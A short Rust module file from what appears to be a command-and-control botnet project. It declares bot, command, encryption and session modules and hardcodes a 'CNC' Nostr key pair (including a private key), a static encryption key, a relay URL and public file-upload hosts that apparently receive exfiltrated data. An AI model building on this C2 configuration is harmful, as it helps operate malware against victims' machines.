pub mod bot;
pub mod command;
pub mod encryption;
pub mod session;

pub const CNC_PUB_KEY: &str = "npub15vx697f47lds48n3k7tmumdex352ct5w6pzxm5a03k9tfdldplas8xcmy4";
pub const CNC_PRIVATE_KEY: &str = "nsec1tgeju2uz0ydlpx5ejte8dlmvfv54ay6zvgwqc4nmmzyy4mgdxrfsjvffp2";

pub const ENCRYPTION_KEY: &str = "mysupersecretkey12345mysupersecret";

pub const RELAY: &str = "wss://relay.primal.net";
// doesn't work
// pub const FILE_STORAGE_SERVER: &str = "https://pomf2.lain.la";

// only allows images, videos etc.
// pub const FILE_STORAGE_SERVER: &str = "https://nostr.build";

// doesn't work
// pub const FILE_STORAGE_SERVER: &str = "https://nostrcheck.me";

// file server that allows lots of stuff
// pub const FILE_STORAGE_SERVER: &str = "https://mockingyou.com/";

pub const FILE_STORAGE_SERVER: &str = "https://files.sovbit.host";
